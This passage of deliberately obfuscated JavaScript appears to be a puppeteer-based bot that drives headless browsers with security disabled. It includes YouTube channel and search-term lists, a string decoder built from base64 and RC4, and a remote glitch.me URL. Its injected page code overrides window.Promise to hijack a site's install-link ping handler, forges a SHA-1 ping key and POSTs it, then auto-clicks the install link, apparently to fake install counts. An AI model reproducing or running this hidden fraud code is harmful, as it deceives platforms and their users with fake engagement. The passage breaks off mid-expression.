              for (J = 0x194b + 0xfb1 + -0xda4 * 0x3; J < -0x2cc * -0xd + 0xdf0 + -0x724 * 0x7; ++J)
                K = Q[J - (-0x1 * -0x506 + -0x264d + 0x214a)] ^ Q[J - (0x1ac4 + -0x1c98 + 0x1dc)] ^ Q[J - (0x11 * -0x112 + -0x1 * 0x122b + 0x246b)] ^ Q[J - (0x1991 + 0x1 * 0x1ea9 + -0x382a)], Q[J] = K << 0x6 * -0x651 + 0x1481 + 0x1166 | K >>> 0x2606 + -0x12d7 * 0x1 + 0x3d0 * -0x5;
              for (J = -0x17 * 0x28 + -0x12ad + 0x1 * 0x1645; J < -0x7b5 + -0x12c9 + 0x1a92; J += -0x1 * 0xb8c + -0x24b7 + 0x3048)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x25b9 + 0xf0d * -0x2 + 0x43d8 | L >>> -0x579 + 0x634 + -0xa0) + (M & N | ~M & O) + P + (0x99d68c07 + -0x3ca51df8 + 0x1 * -0x2aef476) + Q[J] << -0x1f2b + 0xb57 + 0x13d4) << 0x4f * -0x22 + 0x2070 * -0x1 + 0x2af3 | P >>> 0x9 * 0xdb + 0x14f * -0xa + -0x25 * -0x26) + (L & (M = M << -0x12d5 * -0x1 + 0xdd6 + -0x208d | M >>> 0x14ea + 0x2403 + 0x1 * -0x38eb) | ~L & N) + O + (-0x8b0a9a27 + -0x5 * 0x14071ef3 + 0x149b0ae7f) + Q[J + (-0x1fb7 + 0x9c1 + 0x15f7)] << -0x1ede + -0x17c0 + 0x2 * 0x1b4f) << -0xc49 + -0x9 * 0x11f + 0x1665 | O >>> 0x12b9 + 0xdb6 + 0x2054 * -0x1) + (P & (L = L << 0x1e18 + 0x10d * 0x7 + -0x13 * 0x1f7 | L >>> 0x3e8 * 0x7 + -0x23d9 + 0x1 * 0x883) | ~P & M) + N + (-0x90f71133 * 0x1 + 0xa6f * 0x86383 + 0x93f346ff) + Q[J + (0x1994 + 0x4 * -0x16f + -0x1 * 0x13d6)] << -0x1 * 0x1882 + 0x11 * 0x232 + 0x1 * -0xcd0) << 0xfe1 + 0x168 * -0x19 + 0x4c * 0x41 | N >>> 0x16d8 + 0x1 * -0xd46 + -0x1 * 0x977) + (O & (P = P << 0x3 * -0x93 + -0x1 * -0xf2b + -0xd54 | P >>> -0x1 * -0xe94 + 0x198e * 0x1 + 0x282 * -0x10) | ~O & L) + M + (0xb08a61cd + -0x9dbe5340 + 0x28fa865 * 0x1c) + Q[J + (-0x117f * -0x1 + -0x203a + 0xebe * 0x1)] << 0x5c7 * -0x3 + -0x1499 + 0x2 * 0x12f7) << 0x29a + -0x1aaa + -0x1 * -0x1815 | M >>> 0x13 * -0x1fd + 0x125 * -0x16 + 0x3f10) + (N & (O = O << -0x19 * 0xa8 + -0x14d7 + -0x779 * -0x5 | O >>> 0x1c02 + -0x1b3 + -0x1a4d) | ~N & P) + L + (-0x60a30675 + -0x3e5db704 + 0xf9833712) + Q[J + (-0x4fb + -0x33f + 0x83e)] << 0x1 * -0x253d + 0x1 * -0x8e8 + 0x2e25, N = N << -0x158a + 0x7cc + -0x4 * -0x377 | N >>> -0x9 * 0x28c + 0x13 * 0x161 + -0x1f * 0x1b;
              for (; J < 0x454 * -0x8 + 0xfcb + 0x12fd; J += 0x1 * 0x2464 + 0x259b + -0x49fa)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x15b9 + -0x95e * -0x1 + -0x1f12 | L >>> 0xaf + -0x1757 + 0x16c3) + (M ^ N ^ O) + P + (-0x5febcee1 * 0x1 + 0x4ccbb384 + 0x81fa06fe) + Q[J] << -0x9b7 + 0x481 + 0x1 * 0x536) << 0xb27 + -0x1b15 + -0x551 * -0x3 | P >>> -0x10 * 0x25 + 0x5ca + 0x35f * -0x1) + (L ^ (M = M << -0x15f9 + -0xf95 + 0x25ac | M >>> -0xd58 + -0x2371 + 0x30cb) ^ N) + O + (-0xb19c824a + -0x548dfff2 * -0x1 + 0xcbe86df9 * 0x1) + Q[J + (0x96b + -0x1367 + 0x9fd)] << 0x759 * -0x5 + 0x109b * 0x1 + 0x35b * 0x6) << -0x13 * -0x1eb + -0x10d2 + -0x139a | O >>> -0x60a * -0x3 + -0x7b * -0x12 + -0x1aa9) + (P ^ (L = L << -0x609 + -0x227b + -0x1 * -0x28a2 | L >>> -0x1191 + 0x12 * 0xc2 + 0x3ef) ^ M) + N + (0x4442f3 * 0x293 + 0x9465986e + -0xd5440456) + Q[J + (-0x1 * 0x9f5 + -0x949 * -0x2 + 0x1 * -0x89b)] << -0x21c1 * -0x1 + -0x148c + 0x93 * -0x17) << 0x244a + 0x13cf + 0x61 * -0x94 | N >>> -0xfdd * 0x2 + 0x59e * 0x1 + 0x8bd * 0x3) + (O ^ (P = P << -0x367 + -0xef4 + 0x1279 * 0x1 | P >>> 0x25c9 + 0x1684 + -0x6b3 * 0x9) ^ L) + M + (0x56c3 * 0x1d4bf + -0x11c75db * -0x1 + -0x311fc1b7) + Q[J + (-0x226f + 0x42d * 0x4 + 0x11be)] << 0x791 + -0x271 * 0x1 + -0x520) << -0x744 + -0x269c + 0x2de5 | M >>> -0x20c9 + -0x4 * 0x652 + 0x2 * 0x1d16) + (N ^ (O = O << 0xeab + -0x1b * 0x3 + -0x4 * 0x38f | O >>> -0x88a + 0x10f7 + -0x86b) ^ P) + L + (-0x6ed4cbce + -0x1cf * 0x3d5931 + -0x62c9a9 * -0x35e) + Q[J + (0x870 + -0x2f4 + -0xc8 * 0x7)] << 0x2 * -0xcb5 + 0x11 * 0xe8 + 0xa02, N = N << -0xbc4 + 0xcc0 + -0x3 * 0x4a | N >>> 0x1 * -0xf25 + 0x5e * 0x11 + 0x8e9;
              for (; J < -0x385 * -0xb + 0x2290 + 0x17 * -0x32d; J += 0x1c59 + 0x147c * -0x1 + 0x1f6 * -0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2000 + 0x157d * -0x1 + -0xa7e | L >>> -0x61 * -0x32 + -0xb76 + -0x761) + (M & N | M & O | N & O) + P - (-0x4dc6a952 * 0x2 + 0x322bdd * 0x241 + -0x3d * -0x28c0307) + Q[J] << 0xc67 + -0x2 * -0xbf6 + -0x2453) << -0x2 * -0xc65 + -0x7d * -0x45 + 0x3a76 * -0x1 | P >>> 0x4 * -0x534 + -0x1d71 + 0x325c) + (L & (M = M << -0x169c + 0x9a3 * -0x1 + 0x205d | M >>> -0x3 * 0xc2f + 0x207 * 0x3 + 0x1e7a * 0x1) | L & N | M & N) + O - (-0xa43af69d + 0x23bd1502 + 0xf16224bf * 0x1) + Q[J + (0x1a7 + 0x126a + -0x1410 * 0x1)] << 0x117b * -0x2 + 0x61 * 0x25 + 0x6fb * 0x3) << -0xe98 + 0x2c3 * 0xb + -0xfc4 | O >>> 0x7 * 0x254 + -0x300 + -0x133 * 0xb) + (P & (L = L << 0x2ef * 0x1 + 0xb8a + -0xe5b | L >>> -0x9 * 0x24e + -0x1847 + -0x1 * -0x2d07) | P & M | L & M) + N - (0xa9855 * -0xa81 + -0x243d83 * 0x637 + 0xef5a * 0x1e0ab) + Q[J + (0x26 * -0x5e + 0x208c * 0x1 + -0x1296)] << 0x15f6 + 0x5c3 + -0x1bb9) << -0x5 * 0x424 + 0x3 * 0x397 + -0x16c * -0x7 | N >>> 0x2e * -0x2c + -0x3 * 0x68b + -0x74 * -0x3d) + (O & (P = P << 0x1462 + 0x1 * 0x1fc9 + 0x1 * -0x340d | P >>> -0x16 * -0x18a + -0x2160 + -0x7a * 0x1) | O & L | P & L) + M - (0x15 * 0x3c559b5 + -0x6ea2ead5 * -0x2 + -0xbb91ee5f) + Q[J + (-0x489 * 0x2 + -0x262 * 0x10 + -0x5 * -0x971)] << 0x26e * -0x7 + -0xd30 + 0x1e32) << 0x25c2 + -0x474 + 0x1 * -0x2149 | M >>> 0x1b6a * -0x1 + -0x35b * 0x3 + 0x2596) + (N & (O = O << 0x25e * 0xf + -0xbb1 * 0x2 + 0xc02 * -0x1 | O >>> -0x2135 * -0x1 + -0x68d * -0x1 + -0x27c0) | N & P | O & P) + L - (0x90d4eb29 + 0xa54d9924 + -0x5 * 0x2772d9d5) + Q[J + (0x26c6 + -0xa16 + -0x1cac)] << 0x91e + -0x2560 + 0xe21 * 0x2, N = N << -0x1b1a + -0x226f * 0x1 + 0x3da7 | N >>> 0x1865 * -0x1 + 0x25d9 + -0x6b9 * 0x2;
              for (; J < -0x15d7 * -0x1 + -0xd * 0x1df + 0x4 * 0xb3; J += -0x25f5 + -0x1dbb + -0x43b5 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6a4 + -0xa * -0x25f + -0x3 * 0x5af | L >>> 0x1 * -0x1d6c + 0x1cd3 + 0xb4) + (M ^ N ^ O) + P - (-0x585209a3 * 0x1 + 0x4a5f * -0x5ddd + -0x405cd * -0x2a10) + Q[J] << -0x1d11 + 0x1f9f + -0x28e) << -0xcef + 0x11d0 + -0x4dc | P >>> -0x8 * -0x1b7 + -0xb53 + -0x24a) + (L ^ (M = M << 0x1593 + -0x1508 + 0x1 * -0x6d | M >>> 0x6a3 * -0x1 + 0x22b2 + -0x1c0d) ^ N) + O - (0x2ca26fc2 + -0x148b324d + -0x1209c7 * -0x1a3) + Q[J + (-0xa37 + -0x1543 + 0x1f7b * 0x1)] << -0x1 * 0x935 + -0x15d0 + 0x3 * 0xa57) << -0x8fc + -0x316 * -0x8 + -0xfaf | O >>> 0x5 * 0x259 + 0x1c1f + -0x27c1) + (P ^ (L = L << 0x1040 + -0x2ea * -0x1 + -0x130c | L >>> -0x1d7b + 0x1ef3 + 0x11 * -0x16) ^ M) + N - (0x319f36db + -0x5c446cce + 0x6042741d) + Q[J + (0x26f0 * -0x1 + 0x1 * -0xfc2 + 0x36b4)] << 0x2412 + 0x7 * -0x2a1 + -0x11ab) << -0x572 + -0x1 * -0x183f + 0x8 * -0x259 | N >>> 0x1fa5 + -0x629 * -0x3 + -0x3205) + (O ^ (P = P << 0xb47 + 0x2 * -0xbf8 + 0xcc7 * 0x1 | P >>> -0x4b1 * 0x1 + 0x32f * 0x4 + -0x809) ^ L) + M - (-0x83c391 * 0x5f + 0x2fb851e * -0x2 + 0x1 * 0x6c79db35) + Q[J + (-0x2bb + 0x1032 * -0x1 + 0x12f0)] << 0xc6d * -0x1 + 0x1f3c + -0x12cf) << -0x191 * 0x15 + 0x83f + -0x4ef * -0x5 | M >>> -0x775 * 0x5 + 0x724 + -0x790 * -0x4) + (N ^ (O = O << 0x1f21 + 0x1 * -0x264b + -0x1 * -0x748 | O >>> -0x1 * -0x1378 + 0xa7 * -0x19 + -0x3 * 0x10d) ^ P) + L - (-0x172 * -0x291277 + 0x34e4b624 + -0x3aa427f8) + Q[J + (-0x7 * -0xbf + -0x2113 + 0x7b * 0x3a)] << -0xf3e + -0x1628 + 0x2566, N = N << -0x24a2 + -0x17a + 0x263a | N >>> 0x1965 + 0x247e + 0x1ff * -0x1f;
              this['h0'] = this['h0'] + L << -0xb2 * 0x13 + 0x253c + -0x401 * 0x6, this['h1'] = this['h1'] + M << -0x6fd + -0x1956 + 0x2053, this['h2'] = this['h2'] + N << 0xbb * -0x21 + -0x340 + 0x95 * 0x2f, this['h3'] = this['h3'] + O << -0xf76 + 0x335 + 0x1 * 0xc41, this['h4'] = this['h4'] + P << -0x5d3 * 0x1 + 0x13 * 0x14b + 0x12be * -0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x186e + 0x947 + -0x1 * -0xf43 & 0x17ba * 0x1 + -0x176 + 0x17b * -0xf] + w[J >> -0xe + -0xed5 + -0x3b * -0x41 & 0x1380 * 0x1 + 0x1a81 * 0x1 + -0x2df2] + w[J >> -0x3 * 0x23b + -0xba6 + 0x126b & -0xcc + 0x7a * 0x38 + 0x11 * -0x185] + w[J >> -0x7 * 0x219 + -0x15 * 0x192 + 0x2fb9 & 0xfb2 + 0x24ee + -0x3491] + w[J >> 0x1 * -0xb99 + 0x1ea2 + -0x12fd & -0x2285 + -0x1 * -0x74d + 0x1b47] + w[J >> -0x111c + -0x494 * 0x3 + 0x1ee0 & -0x1c7f + 0x1b29 + 0x165] + w[J >> 0x1 * 0x745 + -0x574 * 0x1 + -0x1cd & 0x13 * 0x1a5 + 0x4ab + 0x1 * -0x23db] + w[-0x162 * 0xe + -0x3d1 * -0x4 + 0x427 * 0x1 & J] + w[K >> -0x1f2f * -0x1 + 0xcad + -0x2bc0 & -0xd6 * 0x27 + 0x7b5 + 0x18f4 * 0x1] + w[K >> -0x750 + -0x101 * 0x11 + 0x1879 & 0x1 * -0x2651 + 0x142 + 0x1 * 0x251e] + w[K >> -0x98b + 0xa0f + 0x8 * -0xe & 0x1177 + -0x178a + 0x622] + w[K >> 0xd77 + -0x1877 + 0x4 * 0x2c4 & 0x1af2 + -0x208c + 0x5a9] + w[K >> -0x12b7 * -0x1 + 0x1 * 0x43f + -0x1a3 * 0xe & 0x1 * -0x1678 + -0x2162 + 0x37e9] + w[K >> 0x1 * -0x26e5 + -0xac9 * 0x1 + 0x31b6 & -0x1b01 + -0x5 * -0x43a + -0x2f7 * -0x2] + w[K >> -0x71d + 0x1e7 * -0x5 + 0x5 * 0x354 & 0x263a + -0x901 + 0x2 * -0xe95] + w[0x1a92 + 0x1e5 * 0x1 + 0x1 * -0x1c68 & K] + w[L >> 0x195e + -0x1a5 + -0x179d & 0x7d3 + 0x7f7 * 0x4 + -0x27a0] + w[L >> -0x16c1 + 0x1096 + 0x7 * 0xe5 & 0x2 * 0xd7f + -0x1 * 0x2315 + 0xe * 0x95] + w[L >> 0x3 * 0xa12 + -0x2548 + -0x1e * -0x3d & 0x25e2 + 0x2b5 + -0xa22 * 0x4] + w[L >> -0x18ee + -0x6ff * -0x1 + 0x11ff & 0x6e + -0x483 + 0x424] + w[L >> -0xc02 * 0x2 + -0x1397 + 0x2ba7 & 0xcb3 * -0x2 + 0x23e1 + -0xa6c] + w[L >> -0x937 + -0x6d5 * -0x3 + -0xb40 & -0x13b2 + 0x1ebb * -0x1 + 0x327c] + w[L >> 0xa65 + -0x108a + -0x13 * -0x53 & 0x25 * 0x67 + 0x1 * -0x1bb6 + 0x671 * 0x2] + w[-0x536 + -0x933 + 0xe78 & L] + w[M >> -0x2fa + 0x1a * -0x133 + 0x2244 & -0x1 * 0x233b + 0x2206 + 0x3 * 0x6c] + w[M >> 0x1da7 * -0x1 + 0x1f3d + -0x17e * 0x1 & -0x1e9d + 0x147 * 0x6 + 0xb81 * 0x2] + w[M >> 0x2d9 * -0x9 + 0x15ac + -0x1 * -0x409 & -0x7 * 0x477 + 0x151 + 0x1dff] + w[M >> 0x1a16 + -0x1 * 0x23cb + 0x9c5 * 0x1 & 0x1bd2 + -0xc13 * 0x1 + -0xfb * 0x10] + w[M >> 0x1658 + 0x1081 + -0x26cd & 0x1110 + 0x91e + -0x1a1f] + w[M >> -0xb81 + 0xf70 + -0x3 * 0x14d & -0x205d + -0x3bd + -0x2429 * -0x1] + w[M >> 0x149d + -0x40 * -0x43 + -0x1 * 0x2559 & 0x12 * 0x16e + 0xfa8 + -0x2955] + w[0x61 * 0x35 + 0x758 + -0x1b5e & M] + w[N >> -0x143b + -0x2e * -0xd3 + -0x199 * 0xb & -0x32 + -0x2232 + -0x1 * -0x2273] + w[N >> 0xeb3 + -0x26 * -0xc5 + -0x2bd9 & 0x1b15 + -0x100a + 0x2 * -0x57e] + w[N >> 0x8 * -0x4d + -0x628 + 0x8a4 & 0xb5c + -0x1151 + 0x604] + w[N >> -0x2 * 0x3d7 + 0x1 * -0x568 + 0xd26 & 0x8a3 + 0x95f + -0x11f3] + w[N >> 0x1df2 + 0x1fb * 0x7 + 0x293 * -0x11 & 0x1 * 0x2f9 + 0x144d * -0x1 + 0x1163] + w[N >> -0x377 * 0x9 + 0x95 * -0x43 + 0x4636 & -0x217f + -0x26d4 + -0x221 * -0x22] + w[N >> -0x1a52 + -0x223 * 0x3 + 0x20bf & -0x816 + 0x7 * -0x1b4 + 0x1411] + w[-0x1c41 * 0x1 + 0xb5a + 0x1 * 0x10f6 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xaf3 + 0x9b * 0xd + 0x32c & 0x1 * -0x153d + 0x704 + 0xf38,
                J >> -0x796 * -0x2 + -0x4d * 0x16 + -0x87e & 0x1a * -0x31 + -0x1 * 0xb03 + 0x2 * 0x87e,
                J >> 0x16bd + -0x11c4 * -0x1 + -0x2879 & -0x44 * 0x2f + -0x41 * 0x53 + 0x228e,
                -0xa * 0x8e + 0x11 * -0x211 + 0x17d * 0x1c & J,
                K >> 0x2 * 0x94d + -0x2 * 0xb04 + 0x386 & 0x277 * 0xb + -0x2249 + 0x82b,
                K >> 0x2 * 0xb86 + -0x6 * -0x422 + 0x1 * -0x2fc8 & -0x2 * 0x6a3 + 0x1 * -0x21a7 + 0x2fec,
                K >> -0xf40 + -0x25ee + -0x62 * -0x8b & 0x6d * -0x39 + -0x1 * -0x117 + -0x182d * -0x1,
                -0xe5f + -0xabc + 0x1a1a * 0x1 & K,
                L >> 0x2351 + -0x1 * 0x266 + -0x20d3 & -0x19 * 0xad + -0x7a + 0x2 * 0x92f,
                L >> -0x744 * -0x5 + 0x250e + -0x4952 & -0xf06 + -0x1c4a + 0x13 * 0x255,
                L >> 0x2081 + 0x22ba + -0x4333 & -0x1b1 + -0x146 * -0xb + -0x6 * 0x1e3,
                0x1a1e + -0xaa2 + -0x1 * 0xe7d & L,
                M >> 0x2273 + -0x7e2 + -0x8d3 * 0x3 & -0x22 * -0xaa + 0x1 * -0xe41 + 0x3aa * -0x2,
                M >> -0xb * -0x14b + -0x41d + -0xa0c & -0x995 * -0x1 + -0x47 * 0x8 + -0x65e,
                M >> -0x448 * -0x7 + 0x180d + -0x35fd & -0x1291 * -0x1 + -0x11a3 + 0x11,
                -0xfc5 + 0x26e * -0x1 + 0x999 * 0x2 & M,
                N >> 0x1b * -0xe3 + 0x1 * -0x1df6 + 0x35ff & -0x20dd + -0x1485 + 0x3661,
                N >> -0x171b + -0x1419 + 0x2b44 & -0x396 + 0x1105 + -0xc70,
                N >> -0x1 * 0x18de + -0x24ef + 0x59f * 0xb & 0x3 * 0x7c2 + -0x10e8 + 0x19 * -0x37,
                -0x92f * 0x4 + 0x11cc + 0x13ef & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1f02 + 0x29 * 0xeb + -0x4491), (K = new DataView(J))['setUint32'](-0x171e * -0x1 + 0x69c + -0x1dba, this['h0']), K['setUint32'](0x13 * -0x23 + 0x1 * 0x235d + -0x1 * 0x20c0, this['h1']), K['setUint32'](0x8a3 + 0x26b5 + -0x8 * 0x5ea, this['h2']), K['setUint32'](-0x173b + -0x23c2 + -0x11 * -0x379, this['h3']), K['setUint32'](0x2629 + -0x572 + -0x20a7, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1511 + -0x1a08 + 0x1 * 0x2f19];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x6e7 * 0x4 + -0x1cf2 + 0x17d * 0x26;
            J[0x21d8 + 0x1 * -0x1eaf + -0x329]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1c37 + -0x897 * 0x1 + 0x2 * 0x1267] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x24e0 + -0x14dd + -0x801 * 0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x2 * 0xc0e + -0x1 * -0x10bb + 0x762;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * -0x224b + 0x1 * 0x22e1 + 0x546), Promise['resolve'](-0x16de + 0x179a + -0xbb);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1f2 * -0x7 + 0x29 * -0x11 + 0x1057; j < -0x7ee + 0x153e + 0x1 * -0xd4f; j++)
    i();
}
const NETWORK_PATIENCE = -0x3401 * 0x1 + 0x37b5 + 0x52 * 0x56 + (-0x2069 + -0xc5e + -0x647 * -0x9) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x29 * -0x3c + -0x18ed + 0x24 * 0x6d) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x259b + 0x353 + 0x449 * 0x8);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x259b + 0x353 + 0x449 * 0x8);
    let h = e[f];
    if (b['qbVFpv'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1acf + 0x109d + -0x2b6c, s, t, u = -0x74c * 0x2 + -0x1983 + 0x1 * 0x281b; t = n['charAt'](u++); ~t && (s = r % (-0x958 + 0x8 * 0x331 + -0x102c) ? s * (0x11af + 0x1 * 0x676 + 0x7f7 * -0x3) + t : t, r++ % (0x1 * -0x1e94 + -0x571 + 0x401 * 0x9)) ? p += String['fromCharCode'](-0x1 * -0x1ff + -0x995 * -0x2 + 0xb2 * -0x1d & s >> (-(-0x1561 + -0x19a3 * 0x1 + -0x2 * -0x1783) * r & 0x182a + -0x1ed + -0x1637)) : -0x1fa8 + -0x1570 * -0x1 + -0x51c * -0x2) {
          t = o['indexOf'](t);
        }
        for (let v = -0xf67 + -0x6c2 + -0x1 * -0x1629, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x17c1 + 0x5ad * -0x1 + 0x1d7e))['slice'](-(-0x127 * 0x7 + -0x178 * 0x10 + 0x1f93));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x59e * -0x1 + -0x122 + -0xd8 * -0x8,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x3 * 0x3d7 + 0x1566 + -0x34b * 0x3; u < 0xb5 * 0x32 + 0x21b7 + 0x4411 * -0x1; u++) {
          p[u] = u;
        }
        for (u = 0x2b * 0xcb + 0x41 * 0x17 + 0x354 * -0xc; u < 0xfa3 * 0x2 + -0x7a4 + 0x2 * -0xb51; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x5 * -0x7b9 + -0xc * -0x311 + -0x4a69), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x4c5 + 0x163 * -0x1c + 0x2b99, q = 0x1521 + 0x3 * -0x141 + -0x115e;
        for (let v = -0xd91 + -0x11a2 + 0x1f33; v < n['length']; v++) {
          u = (u + (-0xf37 + -0xa4a * -0x2 + -0x2ae * 0x2)) % (-0x1 * 0x689 + 0xb3a + -0x3b1), q = (q + p[u]) % (-0x525 * -0x3 + 0x1cb * -0x7 + -0x1e2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x728 * 0x3 + 0x1af2 + -0x2f6a)]);
        }
        return t;
      };
      b['GJjpja'] = m, c = arguments, b['qbVFpv'] = !![];
    }
    const j = e[-0x7 * 0x481 + 0x964 + -0x1623 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['ngHLdI'] === undefined && (b['ngHLdI'] = !![]), h = b['GJjpja'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1f50 + 0x6 * -0x3fb + -0x1 * 0x76e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function a() {
  const bk = [
    'l3P5zw5PDgGVtq',
    'ratums.io/',
    'ardcore\x20mi',
    'W4xcNMWRW6ZcPSoNuCkljq',
    'W7Crwb9sWRxcHmoMymkC',
    'CMCVzw4VC2nYAq',
    'y2HPBgroB2rLCW',
    'd-beta-too',
    'zs96AgLODs5JBW',
    'Firefox',
    'WPi8cSkGWOnCFcDlka',
    'oeGYqwLpvJbVrq',
    'yNL0zxm',
    'WPJdVcJcKupcSCklpmkAWQG',
    'A8kXW6b2WQRcG3GXWQyB',
    'zSk1qGpdKSkykCoLW4z/',
    'FmkMgqNdJ8kprCkeWO5+',
    'pCk4sCk3W7PqdSkxiCoX',
    'https://gr'
  ];
  a = function() {
    return bk;
  };
  return a();
}
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 